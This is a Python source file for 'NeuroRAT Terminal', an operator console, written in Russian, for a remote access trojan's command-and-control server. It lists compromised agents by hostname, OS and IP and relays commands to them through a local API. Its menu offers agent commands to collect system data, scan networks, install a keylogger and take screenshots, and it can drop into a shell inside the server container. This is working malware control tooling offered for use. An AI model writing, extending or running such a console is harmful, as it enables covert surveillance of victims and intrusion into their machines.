#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NeuroRAT Terminal - Терминальный интерфейс для прямого взаимодействия и мониторинга агентов
"""
import os
import sys
import json
import time
import requests
import threading
import platform
import subprocess
from datetime import datetime

# Цвета для терминала
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Настройки подключения
API_HOST = "localhost"
API_PORT = "5001"  # 5001 внешний, 5000 внутренний
API_URL = f"http://{API_HOST}:{API_PORT}"

# Глобальные переменные
current_agent = None
log_thread = None
running = True
session_logs = []

def log(message, color=RESET):
    """Записать сообщение в лог с временной меткой"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    session_logs.append(log_entry)
    print(f"{color}{log_entry}{RESET}")

def clear_screen():
    """Очистить экран терминала"""
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def get_agents():
    """Получить список агентов"""
    try:
        response = requests.get(f"{API_URL}/api/agents")
        if response.status_code == 200:
            return response.json()
        else:
            log(f"Ошибка получения агентов: {response.status_code}", RED)
            return []
    except Exception as e:
        log(f"Исключение при получении агентов: {e}", RED)
        return []

def get_agent_details(agent_id):
    """Получить подробную информацию об агенте"""
    try:
        response = requests.get(f"{API_URL}/api/agent/{agent_id}")
        if response.status_code == 200:
            return response.json()
        else:
            log(f"Ошибка получения информации об агенте: {response.status_code}", RED)
            return {}
    except Exception as e:
        log(f"Исключение при получении информации об агенте: {e}", RED)
        return {}

def get_events():
    """Получить последние события"""
    try:
        response = requests.get(f"{API_URL}/api/events")
        if response.status_code == 200:
            return response.json()
        else:
            log(f"Ошибка получения событий: {response.status_code}", RED)
            return []
    except Exception as e:
        log(f"Исключение при получении событий: {e}", RED)
        return []

def send_command(agent_id, command):
    """Отправить команду агенту"""
    try:
        response = requests.post(
            f"{API_URL}/api/agent/{agent_id}/chat",
            json={"message": command}
        )
        if response.status_code == 200:
            return response.json()
        else:
            log(f"Ошибка отправки команды: {response.status_code}", RED)
            return {"error": f"HTTP {response.status_code}", "response": "Ошибка связи с сервером"}
    except Exception as e:
        log(f"Исключение при отправке команды: {e}", RED)
        return {"error": str(e), "response": "Ошибка связи с сервером"}

def monitor_events():
    """Отдельный поток для мониторинга событий"""
    global running
    last_event_count = 0
    
    while running:
        try:
            events = get_events()
            if len(events) > last_event_count:
                new_events = events[:len(events) - last_event_count]
                for event in reversed(new_events):
                    event_type = event.get("Event Type", "unknown")
                    agent = event.get("Agent", "system")
                    details = event.get("Details", "no details")
                    
                    # Определяем цвет в зависимости от типа события
                    color = RESET
                    if "error" in event_type:
                        color = RED
                    elif "connection" in event_type:
                        color = GREEN
                    elif "command" in event_type:
                        color = BLUE
                    elif "data" in event_type:
                        color = MAGENTA
                    
                    log(f"📋 Событие: {event_type} - Агент: {agent} - {details}", color)
                
                last_event_count = len(events)
        except Exception as e:
            log(f"Ошибка мониторинга событий: {e}", RED)
        
        time.sleep(5)

def execute_docker_command(command):
    """Выполнить команду в контейнере Docker"""
    try:
        full_command = f"docker exec -it neurorat-server {command}"
        process = subprocess.Popen(
            full_command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate()
        if process.returncode != 0:
            log(f"Ошибка выполнения команды в Docker: {stderr}", RED)
            return False, stderr
        
        return True, stdout
    except Exception as e:
        log(f"Исключение при выполнении команды в Docker: {e}", RED)
        return False, str(e)

def view_docker_logs():
    """Просмотр логов контейнера в реальном времени"""
    log("Просмотр логов контейнера. Нажмите Ctrl+C для выхода.", YELLOW)
    try:
        subprocess.run("docker logs -f neurorat-server", shell=True)
    except KeyboardInterrupt:
        print("\n")
        log("Просмотр логов завершен.", YELLOW)

def print_header():
    """Вывести заголовок"""
    clear_screen()
    print(f"{BOLD}{MAGENTA}='='='='='='='='='='='='='='='='='='='='='='='={RESET}")
    print(f"{BOLD}{MAGENTA}     NeuroRAT Терминальный Интерфейс     {RESET}")
    print(f"{BOLD}{MAGENTA}='='='='='='='='='='='='='='='='='='='='='='='={RESET}\n")

def print_main_menu():
    """Вывести главное меню"""
    print(f"\n{BOLD}{YELLOW}Доступные команды:{RESET}")
    print(f"  {CYAN}agents{RESET}     - Показать список агентов")
    print(f"  {CYAN}select N{RESET}   - Выбрать агента по номеру")
    print(f"  {CYAN}events{RESET}     - Показать последние события")
    print(f"  {CYAN}logs{RESET}       - Просмотр логов контейнера")
    print(f"  {CYAN}monitor{RESET}    - Включить/выключить мониторинг событий")
    print(f"  {CYAN}bash{RESET}       - Запустить bash в контейнере")
    print(f"  {CYAN}python{RESET}     - Запустить Python в контейнере")
    print(f"  {CYAN}clear{RESET}      - Очистить экран")
    print(f"  {CYAN}help{RESET}       - Показать это меню")
    print(f"  {CYAN}exit{RESET}       - Выйти из программы")
    print(f"\n{BOLD}{YELLOW}В режиме агента доступны команды:{RESET}")
    print(f"  {CYAN}..{RESET}         - Вернуться в главное меню")
    print(f"  {CYAN}STATUS{RESET}     - Запросить статус агента")
    print(f"  {CYAN}COLLECT{RESET}    - Собрать информацию о системе")
    print(f"  {CYAN}SCAN{RESET}       - Сканировать сеть")
    print(f"  {CYAN}KEYLOG{RESET}     - Установить кейлоггер")
    print(f"  {CYAN}SCREENSHOT{RESET} - Сделать скриншот")
    print(f"\n{BOLD}{YELLOW}='='='='='='='='='='='='='='='='='='='='='='='={RESET}")

def show_agent_prompt(agent_id):
    """Показать промпт для ввода команд агенту"""
    agent_details = get_agent_details(agent_id)
    os_type = agent_details.get("os", "Unknown")
    hostname = agent_details.get("hostname", "unknown")
    status = agent_details.get("status", "unknown")
    
    status_color = GREEN if status == "active" else RED
    prompt = f"{BOLD}{BLUE}[Агент:{RESET} {agent_id} | {os_type}@{hostname} | {status_color}{status}{RESET}{BOLD}{BLUE}]{RESET} > "
    return prompt

def display_agents():
    """Отобразить список агентов"""
    agents = get_agents()
    if not agents:
        log("Нет доступных агентов или ошибка соединения с сервером", RED)
        return
    
    print(f"\n{BOLD}{YELLOW}Доступные агенты:{RESET}")
    for i, agent_id in enumerate(agents, 1):
        agent_details = get_agent_details(agent_id)
        status = agent_details.get("status", "unknown")
        os_type = agent_details.get("os", "Unknown")
        hostname = agent_details.get("hostname", "unknown")
        ip = agent_details.get("ip_address", "unknown")
        
        status_color = GREEN if status == "active" else RED
        print(f"  {CYAN}{i}.{RESET} {agent_id} [{os_type}] - {hostname}@{ip} - {status_color}{status}{RESET}")

def display_events():
    """Отобразить последние события"""
    events = get_events()
    if not events:
        log("Нет доступных событий или ошибка соединения с сервером", RED)
        return
    
    print(f"\n{BOLD}{YELLOW}Последние события:{RESET}")
    for i, event in enumerate(events[:10], 1):  # Показываем только 10 последних событий
        event_time = event.get("Time", "unknown")
        event_type = event.get("Event Type", "unknown")
        agent = event.get("Agent", "system")
        details = event.get("Details", "no details")
        
        # Определяем цвет в зависимости от типа события
        color = RESET
        if "error" in event_type:
            color = RED
        elif "connection" in event_type:
            color = GREEN
        elif "command" in event_type:
            color = BLUE
        elif "data" in event_type:
            color = MAGENTA
        
        print(f"  {CYAN}{i}.{RESET} [{event_time}] {color}{event_type}{RESET} - Агент: {agent} - {details}")

def start_monitor_thread():
    """Запустить поток мониторинга событий"""
    global log_thread, running
    
    if log_thread and log_thread.is_alive():
        log("Мониторинг уже запущен", YELLOW)
        return
    
    running = True
    log_thread = threading.Thread(target=monitor_events, daemon=True)
    log_thread.start()
    log("Мониторинг событий запущен", GREEN)

def stop_monitor_thread():
    """Остановить поток мониторинга событий"""
    global running
    
    if log_thread and log_thread.is_alive():
        running = False
        log_thread.join(timeout=1)
        log("Мониторинг событий остановлен", YELLOW)
    else:
        log("Мониторинг не был запущен", YELLOW)

def agent_interaction_mode(agent_id):
    """Режим взаимодействия с агентом"""
    global current_agent
    
    current_agent = agent_id
    log(f"Начало взаимодействия с агентом {agent_id}", GREEN)
    
    while True:
        try:
            command = input(show_agent_prompt(agent_id))
            
            # Обработка команд
            if command.lower() == "..":
                break
            elif command.lower() == "exit":
                return "exit"
            elif command.lower() == "clear":
                clear_screen()
                continue
            
            # Отправка команды агенту
            log(f"Отправка команды агенту {agent_id}: {command}", BLUE)
            response = send_command(agent_id, command)
            
            if "error" in response:
                log(f"Ошибка: {response.get('error')}", RED)
            else:
                print(f"\n{MAGENTA}Ответ агента:{RESET}")
                print(f"{response.get('response', 'Нет ответа')}\n")
        
        except KeyboardInterrupt:
            print("\n")
            log("Взаимодействие прервано пользователем", YELLOW)
            break
        except Exception as e:
            log(f"Ошибка в режиме взаимодействия: {e}", RED)
    
    current_agent = None
    return None

def main():
    """Основная функция"""
    global current_agent
    
    print_header()
    log("Запуск NeuroRAT Терминального Интерфейса", GREEN)
    print_main_menu()
    
    try:
        while True:
            if current_agent:
                result = agent_interaction_mode(current_agent)
                if result == "exit":
                    break
                print_main_menu()
            
            command = input(f"\n{BOLD}{GREEN}NeuroRAT >{RESET} ")
            parts = command.split()
            
            # Обработка основных команд
            if command.lower() == "exit":
                break
            elif command.lower() == "clear":
                clear_screen()
            elif command.lower() == "help":
                print_main_menu()
            elif command.lower() == "agents":
                display_agents()
            elif command.lower() == "events":
                display_events()
            elif command.lower() == "logs":
                view_docker_logs()
            elif parts and parts[0].lower() == "select":
                if len(parts) < 2:
                    log("Необходимо указать номер агента", RED)
                    continue
                
                try:
                    agent_num = int(parts[1])
                    agents = get_agents()
                    
                    if 1 <= agent_num <= len(agents):
                        current_agent = agents[agent_num - 1]
                    else:
                        log(f"Недопустимый номер агента. Доступны: 1-{len(agents)}", RED)
                except ValueError:
                    log("Номер агента должен быть целым числом", RED)
            elif command.lower() == "monitor":
                if log_thread and log_thread.is_alive():
                    stop_monitor_thread()
                else:
                    start_monitor_thread()
            elif command.lower() == "bash":
                log("Запуск bash в контейнере. Введите 'exit' для возврата.", YELLOW)
                subprocess.run("docker exec -it neurorat-server /bin/bash", shell=True)
            elif command.lower() == "python":
                log("Запуск Python в контейнере. Введите 'exit()' для возврата.", YELLOW)
                subprocess.run("docker exec -it neurorat-server python", shell=True)
            else:
                log(f"Неизвестная команда: {command}", RED)
    
    except KeyboardInterrupt:
        print("\n")
        log("Выход по запросу пользователя", YELLOW)
    except Exception as e:
        log(f"Критическая ошибка: {e}", RED)
    finally:
        stop_monitor_thread()
        log("Завершение работы NeuroRAT Терминального Интерфейса", YELLOW)

if __name__ == "__main__":
    main()
